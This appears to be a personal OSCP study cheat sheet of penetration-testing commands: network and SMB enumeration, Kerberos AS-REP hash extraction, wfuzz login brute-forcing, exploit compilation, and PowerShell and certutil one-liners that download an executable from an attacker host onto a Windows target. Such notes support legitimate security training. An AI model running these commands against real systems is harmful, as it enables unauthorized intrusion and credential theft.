# oscp-notes

here is a collection of commands i often use for penetration testing. i know there are hundreds of OSCP command guides/references, this is mostly for personal use and therefore the explanations for each command will be as fleshed out as i need them to be. also bear in mind that this is not a complete list.

note: sometimes i will use "ip-addr" to indicate where a target ip should go, sometimes 10.xx.xx.xx, etc
some of these commands i gleaned from working within the HTB labs, not just pwk lab work.

######enumeration

**service and safe scripts scan of an ip/network range**

-oN saves the output in nmap formatting (-oA saves output in xml/nmap/grep format)

`nmap -sC -sV ip-addr -oN '/root/Documents/[ip-addr]/initial.nmap'`

**udp scan**

`nmap -sU ip-addr`

**full port scan**

`nmap -p- ip-addr`

**OS fingerprint** 

`nmap -O ip-addr`

**snmp enumeration**

`nmap -sU -p 161 --script=snmp-brute -Pn 10.xx.x.xxx --script-args snmp-brute.communitiesdb=common-snmp-community-strings.txt`

**snmpwalk**

`snmpwalk 10.xx.x.xxx:161 -v 1 -c public`

**snmpwalk open tcp ports**

`snmpwalk -c public -v1 10.xx.x.xxx 1.3.6.1.2.1.6.13.1.3 `

**snmpwalk windows processes**

`snmpwalk -c public -v1 10.11.1.128 1.3.6.1.2.1.25.4.2.1.2`

**gobuster using default wordlist and scanning for specific statuses**

`gobuster -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.xx.xx.xx:8080/ -s '200,204,301,302,307,403,500' -o gobuster-common.txt`

**gobuster -- fuzzing for file (vs. dir)**

`gobuster -u http://10.xx.xx.xx -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x aspx -o gobuster-default-aspx.txt`

**gobuster ignore ssl cert**

`gobuster -k`

**wordpress?**

`wpscan -u ip-addr`

**nikto**

`nikto -h ip-addr -output output.txt`

**various methods of enumerating smb shares/servers**

`nmblookup -A 10.xx.xx.xx`

`enum4linux -A 10.xx.xx.xx`

note: enum4linux is finnicky on the pwk vm

**smbclient**

-L | list  -I | ip-address  -N | no-pass

`smbclient -L \\SERVER -I xx.xx.xx.xx -N`

`smbclient //SERVER/share -I xx.xx.xx.xx -N`

**enum kerberos users**

`nmap -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm='CHANGEME.local',userdb=/usr/share/seclists/Usernames/Names/names.txt -oA '/root/Documents/10.xx.xx.xx_88_kerberos' 10.xx.xx.xx`

**obtain hash from kerberos user**

cd /opt/impacket/examples

`python GetNPUsers.py htb.local/ -no-pass -usersfile users.txt -format hashcat -outputfile hashes.forest`

**wfuzz bruteforce http login**

observe the POST request in Burp,  plug in the user and password DOM elemenets into the commmand; here the user login is defined by user_login, and the password is defined as pass

we run it first without specifying a character count to ignore, and once we see what the failed login character count is, we ignore that (--hh), so that any different character count that occurs indicates a successful login (or, something that isn't a failed login)

`wfuzz -z file,/usr/share/wordlists/rockyou.txt -d "user_login=admin&pass=FUZZ" --hh 9471 http://10.xx.xx.xx/admin.php`

**wfuzz fuzz**

wfuzz --hc 404 -c -z file,/usr/share/wfuzz/wordlist/general/big.txt http://10.xx.x.xxx/webmail/src/FUZZ.php

######exploitation

**compile for centos on kali**

(unsure if this is applicable just for centos or other distros)

`gcc -Wl,--hash-style=both -m32 -o exploit 9545.c`

**compile windows exe on linux**

`i686-w64-mingw32-gcc 646-fixed.c -lws2_32 -o 646.exe`

**windows file download**

if system is recent enough/powershell is installed:

`powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.xx.xx.xx/afd.exe','c:\wamp\tmp\afd.exe')`

if certutil is available:

`certutil.exe -urlcache -split -f "http://10.xx.xx.xx/afd.exe" c:\wamp\temp\afd.exe`

if neither is an option, echo this script into a new file:

https://github.com/foxed/oscp-notes/blob/add-notes/scripts/wget.vbs
